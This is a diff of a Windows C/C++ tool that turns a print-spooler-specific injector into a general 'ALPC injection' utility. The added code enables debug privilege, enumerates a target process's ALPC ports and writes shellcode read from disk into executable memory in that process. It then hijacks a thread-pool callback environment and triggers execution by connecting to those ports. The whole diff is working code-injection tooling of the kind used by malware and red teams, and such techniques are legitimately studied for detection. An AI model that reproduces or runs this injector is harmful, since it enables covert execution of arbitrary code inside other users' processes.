@@ -33,15 +33,15 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include <psapi.h>
+#include "ntddk.h"
 
-#include <stdio.h>
+#include <cstdio>
+#include <vector>
+#include <string>
 
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "winspool.lib")
-
-SIZE_T payloadSize;    // size of shellcode
-LPVOID payload;        // local pointer to shellcode
 
 // this structure is derived from TP_CALLBACK_ENVIRON_V3,
 // but also includes two additional values. one to hold
@@ -67,6 +67,30 @@ typedef struct _tp_param_t {
     ULONG_PTR   Callback;
     ULONG_PTR   CallbackParameter;
 } tp_param;
+
+typedef struct _process_info_t {
+  DWORD                     pid;             // process id
+  PWCHAR                    name;            // name of process
+  HANDLE                    hp;              // handle of open process
+  LPVOID                    payload;         // pointer to shellcode
+  DWORD                     payloadSize;     // size of shellcode
+  std::vector<std::wstring> ports;           // alpc ports
+} process_info;
+
+// allocate memory
+LPVOID xmalloc (SIZE_T dwSize) {
+    return HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
+}
+
+// re-allocate memory
+LPVOID xrealloc (LPVOID lpMem, SIZE_T dwSize) { 
+    return HeapReAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, lpMem, dwSize);
+}
+
+// free memory
+void xfree (LPVOID lpMem) {
+    HeapFree (GetProcessHeap(), 0, lpMem);
+}
 
 // display error message for last error code
 VOID xstrerror (PWCHAR fmt, ...){
@@ -119,30 +143,6 @@ BOOL SetPrivilege(PWCHAR szPrivilege, BOOL bEnable){
     return bResult;
 }
 
-#if !defined (__GNUC__)
-/**
- *
- * Returns TRUE if process token is elevated
- *
- */
-BOOL IsElevated(VOID) {
-    HANDLE          hToken;
-    BOOL            bResult = FALSE;
-    TOKEN_ELEVATION te;
-    DWORD           dwSize;
-      
-    if (OpenProcessToken (GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-      if (GetTokenInformation (hToken, TokenElevation, &te,
-          sizeof(TOKEN_ELEVATION), &dwSize)) {
-        bResult = te.TokenIsElevated;
-      }
-      CloseHandle(hToken);
-    }
-    return bResult;
-}
-#endif
-
-
 DWORD name2pid(LPWSTR ImageName) {
     HANDLE         hSnap;
     PROCESSENTRY32 pe32;
@@ -167,48 +167,143 @@ DWORD name2pid(LPWSTR ImageName) {
     return dwPid;
 }
 
+#define MAX_BUFSIZ            8192
+#define INFO_HANDLE_ALPC_PORT 45 // only for Windows 10. probably differs for other systems
+
+/**
+  Get a list of ALPC ports with names
+*/
+DWORD GetALPCPorts(process_info *pi) 
+{    
+    ULONG                      len=0, total=0;
+    NTSTATUS                   status;
+    LPVOID                     list=NULL;    
+    DWORD                      i;
+    HANDLE                     hObj;
+    PSYSTEM_HANDLE_INFORMATION hl;
+    POBJECT_NAME_INFORMATION   objName;
+    
+    pi->ports.clear();
+    
+    // get a list of handles for the local system
+    for(len=MAX_BUFSIZ;;len+=MAX_BUFSIZ) {
+      list = xmalloc(len);
+      status = NtQuerySystemInformation(
+          SystemHandleInformation, list, len, &total);
+      // break from loop if ok    
+      if(NT_SUCCESS(status)) break;
+      // free list and continue
+      xfree(list);   
+    }
+    
+    hl      = (PSYSTEM_HANDLE_INFORMATION)list;
+    objName = (POBJECT_NAME_INFORMATION)xmalloc(8192);
+    
+    // for each handle
+    for(i=0; i<hl->NumberOfHandles; i++) {
+      // skip if process ids don't match
+      if(hl->Handles[i].UniqueProcessId != pi->pid) continue;
+
+      // skip if the type isn't an ALPC port
+      // note this value might be different on other systems.
+      // this was tested on 64-bit Windows 10
+      if(hl->Handles[i].ObjectTypeIndex != 45) continue;
+      
+      // duplicate the handle object
+      status = NtDuplicateObject(
+            pi->hp, (HANDLE)hl->Handles[i].HandleValue, 
+            GetCurrentProcess(), &hObj, 0, 0, 0);
+            
+      // continue with next entry if we failed
+      if(!NT_SUCCESS(status)) continue;
+      
+      // try query the name
+      status = NtQueryObject(hObj, 
+          ObjectNameInformation, objName, 8192, NULL);
+      
+      // got it okay?
+      if(NT_SUCCESS(status) && objName->Name.Buffer!=NULL) {
+        // save to list
+        pi->ports.push_back(objName->Name.Buffer);
+      }
+      // close handle object
+      NtClose(hObj); 
+    }
+    // free list of handles
+    xfree(objName);
+    xfree(list);
+    return pi->ports.size();
+}
+
+// connect to ALPC port
+BOOL ALPC_Connect(std::wstring path) {
+    SECURITY_QUALITY_OF_SERVICE ss;
+    NTSTATUS                    status;
+    UNICODE_STRING              server;
+    ULONG                       MsgLen=0;
+    HANDLE                      h;
+    
+    ZeroMemory(&ss, sizeof(ss));
+    ss.Length              = sizeof(ss);
+    ss.ImpersonationLevel  = SecurityImpersonation;
+    ss.EffectiveOnly       = FALSE;
+    ss.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
+
+    RtlInitUnicodeString(&server, path.c_str());
+    
+		status = NtConnectPort(&h, &server, &ss, NULL, 
+      NULL, (PULONG)&MsgLen, NULL, NULL);
+      
+    NtClose(h);
+    
+    return NT_SUCCESS(status);
+}
+    
 // try inject and run payload in remote process using CBE
-BOOL inject(HANDLE hp, LPVOID ds, PTP_CALLBACK_ENVIRONX cbe) {
+BOOL ALPC_deploy(process_info *pi, LPVOID ds, PTP_CALLBACK_ENVIRONX cbe) {
     LPVOID               cs = NULL;
-    BOOL                 bStatus = FALSE;
+    BOOL                 bInject = FALSE;
     TP_CALLBACK_ENVIRONX cpy;    // local copy of cbe
     SIZE_T               wr;
-    HANDLE               phPrinter = NULL;
     tp_param             tp;
+    DWORD                i;
     
     // allocate memory in remote for payload and callback parameter
-    cs = VirtualAllocEx(hp, NULL, payloadSize + sizeof(tp_param), 
-            MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    cs = VirtualAllocEx(pi->hp, NULL, 
+      pi->payloadSize + sizeof(tp_param), 
+      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             
     if (cs != NULL) {
         // write payload to remote process
-        WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
+        WriteProcessMemory(pi->hp, cs, pi->payload, pi->payloadSize, &wr);
         // backup CBE
         CopyMemory(&cpy, cbe, sizeof(TP_CALLBACK_ENVIRONX));
         // copy original callback address and parameter
         tp.Callback          = cpy.Callback;
         tp.CallbackParameter = cpy.CallbackParameter;
         // write callback+parameter to remote process
-        WriteProcessMemory(hp, (LPBYTE)cs + payloadSize, &tp, sizeof(tp), &wr);
+        WriteProcessMemory(pi->hp, (LPBYTE)cs + pi->payloadSize, &tp, sizeof(tp), &wr);
         // update original callback with address of payload and parameter
         cpy.Callback          = (ULONG_PTR)cs;
-        cpy.CallbackParameter = (ULONG_PTR)(LPBYTE)cs + payloadSize;
+        cpy.CallbackParameter = (ULONG_PTR)(LPBYTE)cs + pi->payloadSize;
         // update CBE in remote process
-        WriteProcessMemory(hp, ds, &cpy, sizeof(cpy), &wr);
+        WriteProcessMemory(pi->hp, ds, &cpy, sizeof(cpy), &wr);
         // trigger execution of payload
-        if(OpenPrinter(NULL, &phPrinter, NULL)) {
-          ClosePrinter(phPrinter);
+        for(i=0;i<pi->ports.size(); i++) {
+          ALPC_Connect(pi->ports[i]);
+          // read back the CBE
+          ReadProcessMemory(pi->hp, ds, &cpy, sizeof(cpy), &wr);
+          // if callback pointer is the original, we succeeded.
+          bInject = (cpy.Callback == cbe->Callback);
+          if(bInject) break;
         }
-        // read back the CBE
-        ReadProcessMemory(hp, ds, &cpy, sizeof(cpy), &wr);
         // restore the original cbe
-        WriteProcessMemory(hp, ds, cbe, sizeof(cpy), &wr);
-        // if callback pointer is the original, we succeeded.
-        bStatus = (cpy.Callback == cbe->Callback);
+        WriteProcessMemory(pi->hp, ds, cbe, sizeof(cpy), &wr);
         // release memory for payload
-        VirtualFreeEx(hp, cs, payloadSize, MEM_RELEASE);
+        VirtualFreeEx(pi->hp, cs, 
+          pi->payloadSize+sizeof(tp), MEM_RELEASE);
     }
-    return bStatus;
+    return bInject;
 }
 
 // validates a windows service IDE
@@ -244,12 +339,11 @@ BOOL IsValidCBE(HANDLE hProcess, PTP_CALLBACK_ENVIRONX cbe) {
     return (mbi.Protect & PAGE_EXECUTE_READ);
 }
 
-BOOL FindEnviron(HANDLE hProcess, 
-  LPVOID BaseAddress, SIZE_T RegionSize) 
+BOOL FindEnviron(process_info *pi, LPVOID BaseAddress, SIZE_T RegionSize) 
 {
     LPBYTE               addr = (LPBYTE)BaseAddress;
     SIZE_T               pos;
-    BOOL                 bRead, bFound=FALSE;
+    BOOL                 bRead, bFound,bInject=FALSE;
     SIZE_T               rd;
     TP_CALLBACK_ENVIRONX cbe;
     WCHAR                filename[MAX_PATH];
@@ -260,7 +354,7 @@ BOOL FindEnviron(HANDLE hProcess,
     {
       bFound = FALSE;
       // try read CBE from writeable memory
-      bRead = ReadProcessMemory(hProcess,
+      bRead = ReadProcessMemory(pi->hp,
         &addr[pos], &cbe, sizeof(TP_CALLBACK_ENVIRONX), &rd);
 
       // if not read, continue
@@ -269,52 +363,65 @@ BOOL FindEnviron(HANDLE hProcess,
       if(rd != sizeof(TP_CALLBACK_ENVIRONX)) continue;
       
       // is this a valid CBE?
-      if(IsValidCBE(hProcess, &cbe)) {
+      bFound=IsValidCBE(pi->hp, &cbe);
+      if(bFound) {
         // obtain module name where callback resides
-        GetMappedFileName(hProcess, (LPVOID)cbe.Callback, filename, MAX_PATH);
+        GetMappedFileName(pi->hp, (LPVOID)cbe.Callback, filename, MAX_PATH);
         wprintf(L"Found CBE at %p for %s\n",  addr+pos, filename);
         // try run payload using this CBE
         // if successful, end scan
-        bFound = inject(hProcess, addr+pos, &cbe);
-        if (bFound) break;
+        bInject = ALPC_deploy(pi, addr+pos, &cbe);
+        if (bInject) break;
       }
     }
-    return bFound;
+    return bInject;
 }
 
-VOID ScanProcess(DWORD pid) {
-    HANDLE                   hProcess;
+BOOL ALPC_inject(process_info *pi) {
     SYSTEM_INFO              si;
     MEMORY_BASIC_INFORMATION mbi;
     LPBYTE                   addr;     // current address
     SIZE_T                   res;
+    BOOL                     bInject=FALSE;
     
-    // try locate the callback environ used for ALPC in print spooler
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    
-    // if process opened
-    if (hProcess != NULL) {
-      // get memory info
-      GetSystemInfo(&si);
-      
-      for (addr=0; addr < (LPBYTE)si.lpMaximumApplicationAddress;) {
-        ZeroMemory(&mbi, sizeof(mbi));
-        res = VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi));
+    // try open the target process. return on error
+    pi->hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi->pid);
+    if(pi->hp==NULL) return FALSE;
 
-        // we only want to scan the heap, but this will scan stack space too.
-        // need to fix that..
-        if ((mbi.State   == MEM_COMMIT)  &&
-            (mbi.Type    == MEM_PRIVATE) && 
-            (mbi.Protect == PAGE_READWRITE)) 
-        {
-          if(FindEnviron(hProcess, mbi.BaseAddress, mbi.RegionSize)) break;
-        }
-        addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
-      }
-      CloseHandle(hProcess);
+    // obtain a list of ALPC ports. return if none found
+    if(!GetALPCPorts(pi)) {
+      CloseHandle(pi->hp);
+      return FALSE;
     }
+
+    // get memory info
+    GetSystemInfo(&si);
+    
+    // scan virtual memory for this process upto maximum address available    
+    for (addr=0; addr<(LPBYTE)si.lpMaximumApplicationAddress;) 
+    {
+      res = VirtualQueryEx(pi->hp, addr, &mbi, sizeof(mbi));
+
+      // we only want to scan the heap, 
+      // but this will scan stack space too.
+      // need to fix that..
+      if ((mbi.State   == MEM_COMMIT)  &&
+          (mbi.Type    == MEM_PRIVATE) && 
+          (mbi.Protect == PAGE_READWRITE)) 
+      {
+        bInject = FindEnviron(pi, mbi.BaseAddress, mbi.RegionSize);
+        if(bInject) break;
+      }
+      // update address to query
+      addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
+    }
+    CloseHandle(pi->hp);
+    return bInject;
 }
 
+/**
+  read a shellcode from disk into memory
+*/
 DWORD readpic(PWCHAR path, LPVOID *pic){
     HANDLE hf;
     DWORD  len,rd=0;
@@ -336,46 +443,39 @@ DWORD readpic(PWCHAR path, LPVOID *pic){
 }
 
 int main(void) {
-    PWCHAR              *argv;
-    int                  argc;
-    DWORD                pid;
-    TP_CALLBACK_ENVIRONX cbe;
+    PWCHAR       *argv;
+    int          argc;
+    process_info pi;
     
     // get parameters
     argv = CommandLineToArgvW(GetCommandLine(), &argc);
     
-    if (argc != 2) {
-      wprintf(L"usage: tpool <payload>\n");
+    if (argc != 3) {
+      wprintf(L"usage: alpc <payload> <process id | process name>\n");
       return 0;
+    }
+    
+    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)) {
+      wprintf(L"can't enable debug privilege.\n");
     }
     
     // try read pic
-    payloadSize = readpic(argv[1], &payload);
-    if(payloadSize == 0) { 
+    pi.payloadSize = readpic(argv[1], &pi.payload);
+    
+    if(pi.payloadSize == 0) { 
       wprintf(L"[-] Unable to read PIC from %s\n", argv[1]); 
       return 0; 
     }
-      
-    // if not elevated, display warning
-    if(!IsElevated()) {
-      wprintf(L"[-] WARNING: This requires elevated privileges!\n");
-    }
-    
-    // try enable debug privilege
-    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)){
-      wprintf(L"[-] Unable to enable debug privilege\n");
-      return 0;
-    }
-    
-    // get process id for spoolsv.exe service
-    pid = name2pid(L"spoolsv.exe");
 
-    if (pid == 0) {
-      wprintf(L"unable to find pid for print spooler.\n");
+    pi.pid=name2pid(argv[2]);
+    
+    if(pi.pid==0) pi.pid=_wtoi(argv[2]);
+    if(pi.pid==0) { 
+      wprintf(L"unable to obtain process id for %s\n", argv[2]);
       return 0;
     }
-    // locate viable CBE in spooler service
-    ScanProcess(pid);
+    wprintf(L"ALPC injection : %s\n", 
+      ALPC_inject(&pi) ? L"OK" : L"FAILED");
     return 0;
 }
 
